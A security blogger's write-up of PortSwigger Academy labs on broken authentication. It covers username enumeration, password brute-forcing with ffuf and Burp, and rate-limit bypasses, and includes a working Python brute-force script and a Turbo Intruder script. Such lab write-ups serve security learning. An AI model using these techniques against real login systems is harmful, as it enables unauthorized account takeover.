---
title: Vulnerable Username-Password Authentication
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-09-30 09:00:00 +0200
categories: [Web Application, Broken Authentication]
tags: [Notes, Web Application, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the Authentication vulnerabilities or [Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication) if we follow [OWASP](https://owasp.org/) naming scheme. 

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/authentication) Labs, but i do intent do throw other labs and writeups here as well.

# Theory
For successful authentication (considering we're not dealing with MFA) we need an username and password. Password usually has to be guessed or brute-forced however username may sometimes be enumerated as well. This may be possible while observing:
- Status Codes
- Error Messages (in response)
- Response Times (if application does SQL check for username and password sequentially)

## TOC

- [Intro](#intro)
- [Theory](#theory)
  - [TOC](#toc)
- [Username enumeration via different responses](#username-enumeration-via-different-responses)
  - [Enumeration](#enumeration)
  - [Username Bruteforcing with Burp Intruder](#username-bruteforcing-with-burp-intruder)
  - [Password Bruteforcing with `ffuf`](#password-bruteforcing-with-ffuf)
- [Username enumeration via subtly different responses](#username-enumeration-via-subtly-different-responses)
  - [Username brute-force using Intruder and Grep - Extract](#username-brute-force-using-intruder-and-grep---extract)
  - [Password brute-force using Intruder and Grep - Extract](#password-brute-force-using-intruder-and-grep---extract)
- [Username enumeration via response timing](#username-enumeration-via-response-timing)
  - [Measuring response for existing and non-existing accounts with Burp Repeater](#measuring-response-for-existing-and-non-existing-accounts-with-burp-repeater)
  - [Brute-Force password](#brute-force-password)
- [Broken brute-force protection, IP block](#broken-brute-force-protection-ip-block)
  - [Intro](#intro-1)
  - [Trying simple password brute-force](#trying-simple-password-brute-force)
  - [Solution #1 - Brute-force using python requests](#solution-1---brute-force-using-python-requests)
  - [Solution #2 - Using Burp Intruder with customized username and password lists.](#solution-2---using-burp-intruder-with-customized-username-and-password-lists)
  - [Solution #3 - Brute-force using Burp Turbo Intruder](#solution-3---brute-force-using-burp-turbo-intruder)
- [Username enumeration via account lock](#username-enumeration-via-account-lock)
- [Broken brute-force protection, multiple credentials per request](#broken-brute-force-protection-multiple-credentials-per-request)

# Username enumeration via different responses
>  This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
> [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
> To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

## Enumeration
We can see the webpage's login:

![picture 36](/assets/images/ed2f89dc6333ed3651c8eb143bfd3954de6481c51d031d9a0b862b84ff01f34b.png)  

Application throws an error `Invalid Username`

![picture 37](/assets/images/9daa12d3a39445aa7ba18da99863ba8859c53432e9efcdcd51f0f4e0f680dafa.png) 

## Username Bruteforcing with Burp Intruder

Let's paste the [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames) into Burp's Intruder:

![picture 38](/assets/images/382a7965940c694ae036d8756a11c5ed811625c734dd9bb4073dd321273a7acd.png)  

We've found the user, which is `user`.

Let's bruteforce the password with `ffuf`

## Password Bruteforcing with `ffuf`

```
ffuf -w portswigger_passwords:FUZZ_PASS  -u "https://0a3e005e03bf0fbac09413a80059004c.web-security-academy.net/login" -d "username=user&password=FUZZ_PASS" --fs 3098
```
Mind that `--fs 3098` was added to filter out the requests which return `invalid password`. They all have same response size.

![picture 39](/assets/images/1ab428ec4afd128fb3d2f93b99253feec82e9309519d37a52f2a47a96945c8af.png)  

Both, username and password have been retrieved. Labb has been solved.

![picture 40](/assets/images/7194fc218858874f87532878610aedcf526d9201fbbaedf1f1d8fa0c989f954b.png)  

# Username enumeration via subtly different responses
>  This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
> 
> [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> 
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
> 
> To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

This lab can be bruteforced with just trying every username or password, however we're supposed to pay attention to *subtly different responses*. 

## Username brute-force using Intruder and Grep - Extract

Let's add `Grep - Export`.

![picture 41](/assets/images/38a2296e2b8ae3a5bd003c4370e580f930f442052009d09b8c7a1213f555b5ad.png)  

As soon as we highlight `Invalid username or password`, parameters will be set automaticaly. Just apply that, set the same username list from portswigger and run the Intruder:

![picture 42](/assets/images/b8180aaebe060ecf4679ecff59891f5b987be0a49710e9b0ef889fffb2634cc1.png)  

One request is slightly different - Username: `alerts`

## Password brute-force using Intruder and Grep - Extract

Let's do the same with the password. Remember to change the password list! `Grep - Extract` can stay the same.

We can notice that `11111111` gave us different response and `HTTP 302`:

![picture 43](/assets/images/568169da8f9339df262cf52ec643d638244ec894e01cffd0f52596fcb0ebb66f.png)  

Lab has been solved

![picture 44](/assets/images/e050b3ff501b65d6c47de9a91aae6173e910402fb5fd3f0101e2a578fc0b3193.png)  

# Username enumeration via response timing

>  This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
> 
> Your credentials: wiener:peter 

Here we've got an account, so we can measure how long does a query need for existing account and for a non-existing.

## Measuring response for existing and non-existing accounts with Burp Repeater

![picture 45](/assets/images/155b764d0fb1664b18b077b515ad727d790405d92ed8de4ba11944d60fe97da1.png)  

We have around 10ms difference. Let's try with the wordlist but watchout:

> Error: You have made too many incorrect login attempts. Please try again in 30 minute(s).

We have to take care of the IP-Block, which we can bypass using `X-Forwarded-For` header. We'd use Pitchfork mode for that, so IP and Username change with every cycle!

![picture 46](/assets/images/81dcfd04785dc9a823502064a558cee19c48cac14619b999d0fcd4649ee9b72f.png)  

We can see that with `access` the difference is even greater, we should however always double-check! ;)

![picture 47](/assets/images/a45d8532d5384070977c8818409162e684cc27e7bb4604091895a0b677c4da0e.png)  

## Brute-Force password
Assuming the username really is `access` let's brute-force password.

Again with using Pitchfork mode and cycling the IPs in `X-Forwarded-For`

![picture 48](/assets/images/70a35935599abac6fc995cce1013edb69a24815c6b5a4bed49d76cf6cbdcadd9.png)  

So there it is, a `sunshine` ;).

This is the problem that i've had. I'll just intercept the request and add some random IP when authenticating as `access:sunshine`

![picture 49](/assets/images/f2f0441040ae46f29db85fd9c8b341040ffd1c97b6ebf5e13181b304d4cdc946.png)  

Lab has been solved:

![picture 50](/assets/images/3b78819400a62f687f5fd54f6dea6185a194096bf619265884c8ecb0364949b2.png)  

# Broken brute-force protection, IP block

>  This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
> Your credentials: wiener:peter
> 
> Victim's username: carlos
> 
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Intro
This would be the second Lab now where we have to bypass the IP block for brute-forcing. Let us get to it. We have a victim `carlos` and we have working credentials

## Trying simple password brute-force

On the 4th try we get a message that we have to wait a minute before trying again.

![picture 51](/assets/images/7885742dfdf2b33bb7adcc14f9410e144003c2e2232636b9b2f9ce82ed6db6a3.png)  

Spoiler Alert: `X-Forwarded-For` does not help here.

What however works is:
- 1st request = Brute-force password for `carlos`
- 2nd request = Brute-force password for `carlos`
- 3rd request = Login with `wiener:peter` which resets the counter
- ...repeat

My ideas here were create a wordlist for username and password where at every 3rd try is come `wiener:peter` credentials. 

## Solution #1 - Brute-force using python requests
In python this is relatively easily scriptable by using 2 for loop cycles.

```py
import requests
import sys

requests.urllib3.disable_warnings()

def bruteforce(target, cycles, password_list, username, working_credz):
    for password in password_list:
        if ":" in password:
            credentials_split = password.split(":")
            password = credentials_split[1]
            username = credentials_split[0]
        else:
            username=username
            password=password
        session = requests.Session()
        session.verify = False
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"username":username, "password":password} 
        s = requests.post(target, data=data, headers=headers)
        if username not in working_credz:
            print("(+) tried %s:%s; Content-Length: %s" %(username,password,s.headers['Content-length']))
            #print(s.headers)
            #print(r.text)
    return 0

def main():
    if len(sys.argv) != 6:
        print("(!) usage: %s <target> <wordlist> <cycles> <working_credentials> <username>" % sys.argv[0])
        print("(!) eg: %s https://target.tld/login ./passwords 2 'user:pass' username" % sys.argv[0])
        sys.exit(-1)
    
    target = str(sys.argv[1])
    wordlist = str(sys.argv[2])
    cycles = int(sys.argv[3])
    working_credz = str(sys.argv[4])
    username = str(sys.argv[5])
    
    print("(+) Target: %s; Wordlist: %s; Cycles before using working credentials: %s; Working Credentials: '%s'; Bruteforcing user: %s" % (target,wordlist,cycles,working_credz,username))

    with open(wordlist) as f:
        passwords = [line.rstrip() for line in f]
        # List needs to be initialy set and should be reset every 3rd turn, but this will be done in for loop
        password_list=[]
        for password in passwords:
            password_list.append(password)
            if len(password_list) == 2:
                password_list.append(working_credz)
                #print("(+) Batch: %s" %(password_list))
                bruteforce_session = bruteforce(target, cycles, password_list, username, working_credz)
                password_list=[]
            else:
                continue
        print("\n(+) All passwords have been checked!")
if __name__ == "__main__":
    main()

```

![picture 54](/assets/images/670231072304ac87bf065668c71435e44d56ece1985dd8fb21b11e3739401aa5.png)

Lab has been solved:

![picture 53](/assets/images/55679382b3b1fb820555fa5f9ffddc91fa4a4e26a90ccd78eb281f05265b7ee3.png)  

## Solution #2 - Using Burp Intruder with customized username and password lists.
This may be easier and faster as we only need to modify scripts in a ways that `wiener:peter` appear after 2nd brute-force attempt. Something like
- carlos:123456
- carlos:123457
- wiener:peter
- carlos:234567
- carlos:234568
- wiener:peter
- etc.

This can be also done using python or bash, by reading file line by line and injecting on 3rd iteration. Mind that in the IF statement, we either output `carlos` or the actual entry in the username/password table.

```bash
#!/bin/bash
# there are no built in checks. Run as following:
# ./custom_wordlist_inject.sh ./portswigger_usernames wiener 3
# ./custom_wordlist_inject.sh <wordlist> <either pass or username that we want to inject> <declare on how many cycles injected string should appear>
bruteforce_list=$1
injection_on=$2
declare -i cycles=$3
declare -i i=0

while read -r line
do 
    i=$i+1
    if (($i<$cycles))
    then
        #for usernames only carlos should show as this is the user that is being brute-forced!. Reading the wordlist isn't really necessary for usernames but i'll let it be. Either commend out this line:
        echo $line
        # or this line
        #echo "carlos"
    else
        echo $injection_on
        i=0
    fi
done < $bruteforce_list
```

Result:
![picture 57](/assets/images/158653a7fb3fd1b344f6378e25048e77d2907f6c274c12c4692273b51d44d278.png)  

We can see that on every 3rd iteration, login should theoreticaly succed. Script above can be piped into file to save it on disk!.

We can throw both lists to Burp Intruder now and use `Pitchfork` mode.

![picture 59](/assets/images/7d83d48a648ad4651dc376f269701cd5b0c4f111299b0f0d3b19ff69e0f58403.png)

Modify the `Resource pool` to `1` or we'll get blocked

![picture 58](/assets/images/fded7ad2c7d58557b1dfe686dd27dcbfbf0d5b5df31fc3c339ce9af0376a202b.png)  

... and bruteforce

![picture 60](/assets/images/be31b3c5b863c343292a36f9c4ab0ea515e8b867db819c0490310794b2541cab.png)  

We've got the password = `mom`. (yes password changes everytime the lab restarts ;)).

## Solution #3 - Brute-force using Burp Turbo Intruder
Simple Burp's Intruder does not have any scripting possiblilties, but Burp's Turbo Intruder does. After installing and enabling it, we just need to select our POST request and choose Turbo Intruder through right mouse click and going into Extensions.

This is how i've set it up:

![picture 62](/assets/images/4de9f48c1e3af5f1cef9905a2238155d1b94cb4cf946836032af39cc35d7e4ab.png)  

Script:
```py
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    i = 0
    for word in open('/Users/lukaosojnik/Downloads/pw'):
        i = i + 1
        if i < 2:
            # do one free run
            engine.queue(target.req, ["carlos", word.rstrip()])
        elif i == 2:
            # do one extra run and reset with valid credentials
            engine.queue(target.req, ["carlos", word.rstrip()])
            engine.queue(target.req, ["wiener", "peter"])
            i = 0
        else:
            break

def handleResponse(req, interesting):
    if interesting:
        table.add(req)

```

![picture 61](/assets/images/23550081d9a1cd3eafa016c52dd8595290be31b8b3c21799be6917fd3bf0f408.png)  

It would also be possible to use `@MatchStatus(302)`, which would only display responses with status code 302.

Reference: https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack

# Username enumeration via account lock

This lab was done by `ffuf`. I used `head -n 10` command on the password list to make a list with 10 passwords. This list was looped through all usernames. 

![picture 63](/assets/images/6c5267a4484d16fde7b28f4354d2bf081814d8f0a84d8b371afc0197a17645b3.png)  

User `adam` stood out, so it was brute-forced again using whole password list.

```sh
ffuf -w portswigger_passwords:FUZZ_PW -H "Content-Type: application/x-www-form-urlencoded" -u "https://0a58009d041cd3f7c0ae1c7f007000a9.web-security-academy.net/login" -d "username=adam&password=FUZZ_PW" --fs 3049 --fs 3101 -x http://127.0.0.1:8080
```
Obviously there is a difference if password maches. Below the comparisson using Burp Comparer:

![picture 65](/assets/images/2fcc656d531f93859dab30119e5a74cc6a6b7943e6b2472d73839d728faf56f0.png)  

Most probable password `dragon` has been found and Lab has been solved

![picture 64](/assets/images/e83a27806f27f6161c2884b62bd03b08a9c8832a28409b7040f067bb1b981a8b.png)  


# Broken brute-force protection, multiple credentials per request

>  This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page
> Victim's username: carlos
> Candidate passwords

If web applications login mechanismus is broken and lets you authenticate using multiple passwords as one then that's definately a security issue. This is exactle what the application in the lab is doing. Let's check it out.

![picture 66](/assets/images/a837169de77e63c94acd86b5ad3edb04189918189b5e78ce6797da39fc80ed58.png)  

When testing login, we can notice that now we're dealing with JSON. Let's try to include multiple passwords in the same Repeater request.

![picture 67](/assets/images/97b41704edd0e4422296190b1128c31ec47e4f91ae519f09321321e3e499b8e9.png)  

Apparently we've succeded but we don't know what the password is, but if we open the session in browser we see that we've succesfully finished the lab and that we're login.

![picture 68](/assets/images/76d301a8d16302697566158223b3d6702286aaf87c5aa928e76f2b86479f3f97.png)  
